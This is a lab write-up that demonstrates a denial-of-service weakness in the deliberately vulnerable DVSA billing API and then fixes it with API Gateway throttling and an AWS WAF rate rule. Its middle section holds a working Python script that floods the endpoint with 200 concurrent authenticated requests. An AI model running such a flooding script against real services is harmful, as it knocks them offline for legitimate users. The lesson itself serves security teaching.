Lesson 6: Denial of Service (DoS)
=================================

Overview
-----------

This lesson demonstrates a **Denial of Service (DoS)** vulnerability in the DVSA billing system.\
By sending many concurrent requests, the system becomes unstable and fails to process legitimate requests.

* * * * *

Goal
-------

To show that the billing API can be overwhelmed by multiple requests, and then verify that applying security controls prevents this attack.

* * * * *

Requirements
---------------

Before starting, make sure you have:

-   Access to DVSA web application

-   Python installed (with `requests` library)

-   Browser (Chrome recommended)

-   Postman (optional)

* * * * *

Step-by-Step Reproduction
----------------------------

* * * * *

###  Step 1: Create a New Order

1.  Open the DVSA application

2.  Add any product to cart

3.  Proceed to checkout until you reach the billing page


* * * * *

###  Step 2: Capture a Valid Request

1.  Open **Developer Tools (F12)**

2.  Go to **Network tab**

3.  Perform an action (like shipping or billing)

4.  Find request:

```
POST /dvsa/order

```

1.  Click the request → open **Payload tab**

2.  Copy:

    -   `order-id`

    -   request body

3.  Go to **Headers tab**

4.  Copy:

    -   `Authorization` token


* * * * *

### Step 3: Test Request in Postman

1.  Open Postman

2.  Create a POST request:

```
https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order

```

1.  Add Headers:

```
Authorization: <your_token>
Content-Type: application/json

```

1.  Add Body (raw JSON):

```
{
  "action": "billing",
  "order-id": "<your_order_id>",
  "data": {
    "ccn": "4242424242424242",
    "exp": "03/28",
    "cvv": "123"
  }
}

```

1.  Click **Send**

 Expected result:

```
"order already made"

```

 This confirms the request is valid

See:

```
evidence/normal_request.png

```

* * * * *

###  Step 4: Run DoS Attack Script

1.  Create a file:

```
dos_test.py

```

1.  Paste the following code:

```
import threading
import requests

url = "https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order"

headers = {
    "Authorization": "<your_token>",
    "Content-Type": "application/json"
}

payload = {
    "action": "billing",
    "order-id": "<your_order_id>",
    "data": {
        "ccn": "4242424242424242",
        "exp": "03/28",
        "cvv": "123"
    }
}

def send_request(i):
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"{i}: {response.status_code}")
    except Exception:
        print(f"{i}: ERROR")

threads = []

for i in range(200):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

```

1.  Run:

```
python dos_test.py

```

* * * * *

###  Step 5: Observe Attack Result (Before Fix)

 Expected:

-   Some requests → `200 OK`

-   Many requests → `500 / 502`

-   Slow responses

 Meaning:

-   System becomes unstable

-   Backend overloaded

See:

```
evidence/dos_attack_output.png

```

* * * * *

Fix Applied
---------------

### 1\. API Gateway Throttling

-   Limit requests per second

-   Prevent excessive traffic

See:

```
evidence/api_gateway_after.png

```

* * * * *

### 2\. AWS WAF Rate-Based Rule

-   Block repeated requests from same IP

-   Example: 100 requests per 5 minutes

* * * * *

Step 6: Verify After Fix
--------------------------

1.  Run the same script again:

```
python dos_test.py

```

Expected:

```
403 Forbidden

```

Meaning:

-   Attack is blocked

-   Requests do NOT reach backend

See:

```
evidence/waf_block.png

```

* * * * *

Final Result
--------------

| Phase | Behavior |
| --- | --- |
| Before Fix | 500 errors, unstable system |
| After Fix | 403 blocked requests |
| Legitimate User | Works normally |

* * * * *

Files Included
-----------------

-   `dos_test.py` → DoS attack script

-   `evidence/` → Screenshots of each step

* * * * *

Key Lesson
-------------

Without request control, serverless systems can be overwhelmed easily.\
Applying rate limiting and traffic filtering protects system availability.

* * * * *
